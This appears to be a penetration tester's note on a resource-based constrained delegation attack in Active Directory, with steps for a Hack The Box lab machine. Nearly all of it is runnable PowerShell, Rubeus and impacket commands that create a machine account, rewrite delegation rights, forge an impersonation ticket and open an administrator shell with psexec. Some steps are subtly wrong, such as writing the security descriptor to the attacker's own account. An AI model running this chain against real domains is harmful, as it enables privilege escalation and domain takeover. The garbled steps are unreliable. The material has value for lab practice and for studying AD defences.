Full control of a computer object can be used to perform a resource based constrained delegation attack.

Abusing this primitive is possible through the Rubeus project.

First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:

```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:

```
Get-DomainComputer attackersystem | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:

```
Rubeus.exe hash /password:Summer2018!
```

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

```
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

What do to with the ticket:
1. save the ticket to file in Kali (remove all the spaces before each line!)
2. Decode the ticket from b64:
	`base64 -d ticket.kirbi > ticket.kirbi.b64`
3. Use impacket's ticketconverter.py to convert the ticket to .ccache format:
	`ticketConverter.py ticket.kirbi.b64 ticket.ccache`
	- `ticket.kirbi.b64`: the original ticket in base64 format
	- `ticket.ccache`: the ccache ticket will be saved in this file
4. `KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb`
	- `-k`: specify kerberos
	- `-nopass`: specify no password
	- `support.htb/administrator@dc.support.htb`: use the fully qualified domain

> Check the output of `sudo nmap -p [ports] [ip] -Pn -A -sCV -O` for the clock skew! If it is off by more than around 5 seconds then you cannot connect, because Kerberos is time-sensitive. Use `sudo rdate -n 10.10.11.174` to sync time with the host.